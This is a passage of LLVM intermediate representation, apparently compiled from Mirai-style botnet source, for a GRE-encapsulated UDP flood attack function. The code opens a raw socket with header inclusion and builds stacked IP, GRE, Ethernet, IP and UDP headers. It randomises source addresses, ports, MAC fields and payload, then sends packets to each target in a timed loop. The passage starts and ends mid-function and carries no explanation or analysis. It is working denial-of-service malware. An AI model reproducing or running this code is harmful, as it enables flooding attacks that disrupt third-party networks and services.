  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias align 16 i8* @calloc(i64 %45, i64 8) #4
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 2, i32 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 3, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 4, i32 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 5, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 6, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 0, i32 512)
  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 1, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 18, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 24, i32 %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* null) #4
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = add nsw i64 %87, %89
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %24, align 4
  %92 = call i32 @socket(i32 2, i32 3, i32 6) #4
  store i32 %92, i32* %12, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %95

94:                                               ; preds = %5
  br label %490

95:                                               ; preds = %5
  store i32 1, i32* %11, align 4
  %96 = load i32, i32* %12, align 4
  %97 = bitcast i32* %11 to i8*
  %98 = call i32 @setsockopt(i32 %96, i32 0, i32 3, i8* %97, i32 4) #4
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %103

100:                                              ; preds = %95
  %101 = load i32, i32* %12, align 4
  %102 = call i32 @close(i32 %101)
  br label %490

103:                                              ; preds = %95
  store i32 0, i32* %11, align 4
  br label %104

104:                                              ; preds = %260, %103
  %105 = load i32, i32* %11, align 4
  %106 = load i8, i8* %7, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp slt i32 %105, %107
  br i1 %108, label %109, label %263

109:                                              ; preds = %104
  %110 = call noalias align 16 i8* @calloc(i64 1510, i64 8) #4
  %111 = load i8**, i8*** %13, align 8
  %112 = load i32, i32* %11, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  store i8* %110, i8** %114, align 8
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  %119 = load i8*, i8** %118, align 8
  %120 = bitcast i8* %119 to %struct.iphdr*
  store %struct.iphdr* %120, %struct.iphdr** %25, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i64 1
  %123 = bitcast %struct.iphdr* %122 to %struct.grehdr*
  store %struct.grehdr* %123, %struct.grehdr** %26, align 8
  %124 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %125 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %124, i64 1
  %126 = bitcast %struct.grehdr* %125 to %struct.ethhdr*
  store %struct.ethhdr* %126, %struct.ethhdr** %27, align 8
  %127 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %128 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %127, i64 1
  %129 = bitcast %struct.ethhdr* %128 to %struct.iphdr*
  store %struct.iphdr* %129, %struct.iphdr** %28, align 8
  %130 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i64 1
  %132 = bitcast %struct.iphdr* %131 to %struct.udphdr*
  store %struct.udphdr* %132, %struct.udphdr** %29, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %134 = bitcast %struct.iphdr* %133 to i8*
  %135 = load i8, i8* %134, align 4
  %136 = and i8 %135, 15
  %137 = or i8 %136, 64
  store i8 %137, i8* %134, align 4
  %138 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %139 = bitcast %struct.iphdr* %138 to i8*
  %140 = load i8, i8* %139, align 4
  %141 = and i8 %140, -16
  %142 = or i8 %141, 5
  store i8 %142, i8* %139, align 4
  %143 = load i8, i8* %14, align 1
  %144 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 1
  store i8 %143, i8* %145, align 1
  %146 = load i32, i32* %20, align 4
  %147 = sext i32 %146 to i64
  %148 = add i64 66, %147
  %149 = trunc i64 %148 to i16
  %150 = call zeroext i16 @htons(i16 zeroext %149) #5
  %151 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 2
  store i16 %150, i16* %152, align 2
  %153 = load i16, i16* %15, align 2
  %154 = call zeroext i16 @htons(i16 zeroext %153) #5
  %155 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 3
  store i16 %154, i16* %156, align 4
  %157 = load i8, i8* %16, align 1
  %158 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 5
  store i8 %157, i8* %159, align 4
  %160 = load i8, i8* %17, align 1
  %161 = icmp ne i8 %160, 0
  br i1 %161, label %162, label %166

162:                                              ; preds = %109
  %163 = call zeroext i16 @htons(i16 zeroext 16384) #5
  %164 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 4
  store i16 %163, i16* %165, align 2
  br label %166

166:                                              ; preds = %162, %109
  %167 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 6
  store i8 47, i8* %168, align 1
  %169 = load i32, i32* %23, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 8
  store i32 %169, i32* %171, align 4
  %172 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 1
  %177 = load i32, i32* %176, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 9
  store i32 %177, i32* %179, align 4
  %180 = call zeroext i16 @htons(i16 zeroext 25944) #5
  %181 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %182 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %181, i32 0, i32 1
  store i16 %180, i16* %182, align 2
  %183 = call zeroext i16 @htons(i16 zeroext 2048) #5
  %184 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %185 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %184, i32 0, i32 2
  store i16 %183, i16* %185, align 1
  %186 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %187 = bitcast %struct.iphdr* %186 to i8*
  %188 = load i8, i8* %187, align 4
  %189 = and i8 %188, 15
  %190 = or i8 %189, 64
  store i8 %190, i8* %187, align 4
  %191 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %192 = bitcast %struct.iphdr* %191 to i8*
  %193 = load i8, i8* %192, align 4
  %194 = and i8 %193, -16
  %195 = or i8 %194, 5
  store i8 %195, i8* %192, align 4
  %196 = load i8, i8* %14, align 1
  %197 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 1
  store i8 %196, i8* %198, align 1
  %199 = load i32, i32* %20, align 4
  %200 = sext i32 %199 to i64
  %201 = add i64 28, %200
  %202 = trunc i64 %201 to i16
  %203 = call zeroext i16 @htons(i16 zeroext %202) #5
  %204 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 2
  store i16 %203, i16* %205, align 2
  %206 = load i16, i16* %15, align 2
  %207 = zext i16 %206 to i32
  %208 = xor i32 %207, -1
  %209 = trunc i32 %208 to i16
  %210 = call zeroext i16 @htons(i16 zeroext %209) #5
  %211 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 3
  store i16 %210, i16* %212, align 4
  %213 = load i8, i8* %16, align 1
  %214 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 5
  store i8 %213, i8* %215, align 4
  %216 = load i8, i8* %17, align 1
  %217 = icmp ne i8 %216, 0
  br i1 %217, label %218, label %222

218:                                              ; preds = %166
  %219 = call zeroext i16 @htons(i16 zeroext 16384) #5
  %220 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 4
  store i16 %219, i16* %221, align 2
  br label %222

222:                                              ; preds = %218, %166
  %223 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 6
  store i8 17, i8* %224, align 1
  %225 = call i32 @rand_next()
  %226 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 8
  store i32 %225, i32* %227, align 4
  %228 = load i8, i8* %22, align 1
  %229 = icmp ne i8 %228, 0
  br i1 %229, label %230, label %236

230:                                              ; preds = %222
  %231 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 9
  %233 = load i32, i32* %232, align 4
  %234 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 9
  store i32 %233, i32* %235, align 4
  br label %244

236:                                              ; preds = %222
  %237 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 8
  %239 = load i32, i32* %238, align 4
  %240 = sub i32 %239, 1024
  %241 = xor i32 %240, -1
  %242 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 9
  store i32 %241, i32* %243, align 4
  br label %244

244:                                              ; preds = %236, %230
  %245 = load i16, i16* %18, align 2
  %246 = call zeroext i16 @htons(i16 zeroext %245) #5
  %247 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %248 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %247, i32 0, i32 0
  store i16 %246, i16* %248, align 2
  %249 = load i16, i16* %19, align 2
  %250 = call zeroext i16 @htons(i16 zeroext %249) #5
  %251 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %252 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %251, i32 0, i32 1
  store i16 %250, i16* %252, align 2
  %253 = load i32, i32* %20, align 4
  %254 = sext i32 %253 to i64
  %255 = add i64 8, %254
  %256 = trunc i64 %255 to i16
  %257 = call zeroext i16 @htons(i16 zeroext %256) #5
  %258 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %259 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %258, i32 0, i32 2
  store i16 %257, i16* %259, align 2
  br label %260

260:                                              ; preds = %244
  %261 = load i32, i32* %11, align 4
  %262 = add nsw i32 %261, 1
  store i32 %262, i32* %11, align 4
  br label %104, !llvm.loop !9

263:                                              ; preds = %104
  br label %264

264:                                              ; preds = %263, %489
  store i32 0, i32* %11, align 4
  br label %265

265:                                              ; preds = %480, %264
  %266 = load i32, i32* %11, align 4
  %267 = load i8, i8* %7, align 1
  %268 = zext i8 %267 to i32
  %269 = icmp slt i32 %266, %268
  br i1 %269, label %270, label %483

270:                                              ; preds = %265
  %271 = load i8**, i8*** %13, align 8
  %272 = load i32, i32* %11, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds i8*, i8** %271, i64 %273
  %275 = load i8*, i8** %274, align 8
  store i8* %275, i8** %33, align 8
  %276 = load i8*, i8** %33, align 8
  %277 = bitcast i8* %276 to %struct.iphdr*
  store %struct.iphdr* %277, %struct.iphdr** %34, align 8
  %278 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %279 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %278, i64 1
  %280 = bitcast %struct.iphdr* %279 to %struct.grehdr*
  store %struct.grehdr* %280, %struct.grehdr** %35, align 8
  %281 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %282 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %281, i64 1
  %283 = bitcast %struct.grehdr* %282 to %struct.ethhdr*
  store %struct.ethhdr* %283, %struct.ethhdr** %36, align 8
  %284 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %285 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %284, i64 1
  %286 = bitcast %struct.ethhdr* %285 to %struct.iphdr*
  store %struct.iphdr* %286, %struct.iphdr** %37, align 8
  %287 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i64 1
  %289 = bitcast %struct.iphdr* %288 to %struct.udphdr*
  store %struct.udphdr* %289, %struct.udphdr** %38, align 8
  %290 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %291 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %290, i64 1
  %292 = bitcast %struct.udphdr* %291 to i8*
  store i8* %292, i8** %39, align 8
  %293 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %294 = load i32, i32* %11, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 2
  %298 = load i8, i8* %297, align 4
  %299 = zext i8 %298 to i32
  %300 = icmp slt i32 %299, 32
  br i1 %300, label %301, label %322

301:                                              ; preds = %270
  %302 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %303 = load i32, i32* %11, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i32 0, i32 1
  %307 = load i32, i32* %306, align 4
  %308 = call i32 @ntohl(i32 %307) #5
  %309 = call i32 @rand_next()
  %310 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %311 = load i32, i32* %11, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 2
  %315 = load i8, i8* %314, align 4
  %316 = zext i8 %315 to i32
  %317 = lshr i32 %309, %316
  %318 = add i32 %308, %317
  %319 = call i32 @htonl(i32 %318) #5
  %320 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 9
  store i32 %319, i32* %321, align 4
  br label %322

322:                                              ; preds = %301, %270
  %323 = load i32, i32* %23, align 4
  %324 = icmp eq i32 %323, -1
  br i1 %324, label %325, label %329

325:                                              ; preds = %322
  %326 = call i32 @rand_next()
  %327 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 8
  store i32 %326, i32* %328, align 4
  br label %329

329:                                              ; preds = %325, %322
  %330 = load i16, i16* %15, align 2
  %331 = zext i16 %330 to i32
  %332 = icmp eq i32 %331, 65535
  br i1 %332, label %333, label %348

333:                                              ; preds = %329
  %334 = call i32 @rand_next()
  %335 = and i32 %334, 65535
  %336 = trunc i32 %335 to i16
  %337 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 3
  store i16 %336, i16* %338, align 4
  %339 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  %341 = load i16, i16* %340, align 4
  %342 = zext i16 %341 to i32
  %343 = sub nsw i32 %342, 1000
  %344 = xor i32 %343, -1
  %345 = trunc i32 %344 to i16
  %346 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %347 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %346, i32 0, i32 3
  store i16 %345, i16* %347, align 4
  br label %348

348:                                              ; preds = %333, %329
  %349 = load i16, i16* %18, align 2
  %350 = zext i16 %349 to i32
  %351 = icmp eq i32 %350, 65535
  br i1 %351, label %352, label %358

352:                                              ; preds = %348
  %353 = call i32 @rand_next()
  %354 = and i32 %353, 65535
  %355 = trunc i32 %354 to i16
  %356 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %357 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %356, i32 0, i32 0
  store i16 %355, i16* %357, align 2
  br label %358

358:                                              ; preds = %352, %348
  %359 = load i16, i16* %19, align 2
  %360 = zext i16 %359 to i32
  %361 = icmp eq i32 %360, 65535
  br i1 %361, label %362, label %368

362:                                              ; preds = %358
  %363 = call i32 @rand_next()
  %364 = and i32 %363, 65535
  %365 = trunc i32 %364 to i16
  %366 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %367 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %366, i32 0, i32 1
  store i16 %365, i16* %367, align 2
  br label %368

368:                                              ; preds = %362, %358
  %369 = load i8, i8* %22, align 1
  %370 = icmp ne i8 %369, 0
  br i1 %370, label %375, label %371

371:                                              ; preds = %368
  %372 = call i32 @rand_next()
  %373 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %374 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %373, i32 0, i32 9
  store i32 %372, i32* %374, align 4
  br label %381

375:                                              ; preds = %368
  %376 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i32 0, i32 9
  %378 = load i32, i32* %377, align 4
  %379 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %380 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %379, i32 0, i32 9
  store i32 %378, i32* %380, align 4
  br label %381

381:                                              ; preds = %375, %371
  %382 = call i32 @rand_next()
  store i32 %382, i32* %40, align 4
  %383 = call i32 @rand_next()
  store i32 %383, i32* %41, align 4
  %384 = call i32 @rand_next()
  store i32 %384, i32* %42, align 4
  %385 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %386 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %385, i32 0, i32 0
  %387 = getelementptr inbounds [6 x i8], [6 x i8]* %386, i64 0, i64 0
  %388 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %387, i8* %388, i32 4)
  %389 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %390 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %389, i32 0, i32 1
  %391 = getelementptr inbounds [6 x i8], [6 x i8]* %390, i64 0, i64 0
  %392 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %391, i8* %392, i32 4)
  %393 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %394 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %393, i32 0, i32 0
  %395 = getelementptr inbounds [6 x i8], [6 x i8]* %394, i64 0, i64 0
  %396 = getelementptr inbounds i8, i8* %395, i64 4
  %397 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %396, i8* %397, i32 2)
  %398 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %399 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %398, i32 0, i32 1
  %400 = getelementptr inbounds [6 x i8], [6 x i8]* %399, i64 0, i64 0
  %401 = getelementptr inbounds i8, i8* %400, i64 4
  %402 = bitcast i32* %42 to i8*
  %403 = getelementptr inbounds i8, i8* %402, i64 2
  call void @util_memcpy(i8* %401, i8* %403, i32 2)
  %404 = load i8, i8* %21, align 1
  %405 = icmp ne i8 %404, 0
  br i1 %405, label %406, label %413

406:                                              ; preds = %381
  %407 = load i8*, i8** %39, align 8
  %408 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %407, i32 %408)
  %409 = load i8*, i8** %39, align 8
  %410 = load i32, i32* %20, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds i8, i8* %409, i64 %411
  store i8 0, i8* %412, align 1
  br label %413

413:                                              ; preds = %406, %381
  %414 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 0, i16* %415, align 2
  %416 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %417 = bitcast %struct.iphdr* %416 to i16*
  %418 = call zeroext i16 @checksum_generic(i16* %417, i32 20)
  %419 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 7
  store i16 %418, i16* %420, align 2
  %421 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 7
  store i16 0, i16* %422, align 2
  %423 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %424 = bitcast %struct.iphdr* %423 to i16*
  %425 = call zeroext i16 @checksum_generic(i16* %424, i32 20)
  %426 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %427 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %426, i32 0, i32 7
  store i16 %425, i16* %427, align 2
  %428 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %429 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %428, i32 0, i32 3
  store i16 0, i16* %429, align 2
  %430 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %431 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %432 = bitcast %struct.udphdr* %431 to i8*
  %433 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %434 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %433, i32 0, i32 2
  %435 = load i16, i16* %434, align 2
  %436 = load i32, i32* %20, align 4
  %437 = sext i32 %436 to i64
  %438 = add i64 8, %437
  %439 = trunc i64 %438 to i32
  %440 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %430, i8* %432, i16 zeroext %435, i32 %439)
  %441 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %442 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %441, i32 0, i32 3
  store i16 %440, i16* %442, align 2
  %443 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %444 = load i32, i32* %11, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i64 %445
  %447 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i32 0, i32 0
  %448 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %447, i32 0, i32 0
  store i16 2, i16* %448, align 4
  %449 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %450 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %449, i32 0, i32 9
  %451 = load i32, i32* %450, align 4
  %452 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %453 = load i32, i32* %11, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %452, i64 %454
  %456 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %455, i32 0, i32 0
  %457 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %456, i32 0, i32 2
  %458 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %457, i32 0, i32 0
  store i32 %451, i32* %458, align 4
  %459 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %460 = load i32, i32* %11, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %459, i64 %461
  %463 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %462, i32 0, i32 0
  %464 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %463, i32 0, i32 1
  store i16 0, i16* %464, align 2
  %465 = load i32, i32* %12, align 4
  %466 = load i8*, i8** %33, align 8
  %467 = load i32, i32* %20, align 4
  %468 = sext i32 %467 to i64
  %469 = add i64 66, %468
  %470 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %471 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %472 = load i32, i32* %11, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %471, i64 %473
  %475 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %474, i32 0, i32 0
  %476 = bitcast %struct.sockaddr_in* %475 to %struct.sockaddr*
  store %struct.sockaddr* %476, %struct.sockaddr** %470, align 8
  %477 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %478 = load %struct.sockaddr*, %struct.sockaddr** %477, align 8
  %479 = call i64 @sendto(i32 %465, i8* %466, i64 %469, i32 16384, %struct.sockaddr* %478, i32 16)
  br label %480

480:                                              ; preds = %413
  %481 = load i32, i32* %11, align 4
  %482 = add nsw i32 %481, 1
  store i32 %482, i32* %11, align 4
  br label %265, !llvm.loop !10

483:                                              ; preds = %265
  %484 = call i64 @time(i64* null) #4
  %485 = load i32, i32* %24, align 4
  %486 = sext i32 %485 to i64
  %487 = icmp sgt i64 %484, %486
  br i1 %487, label %488, label %489

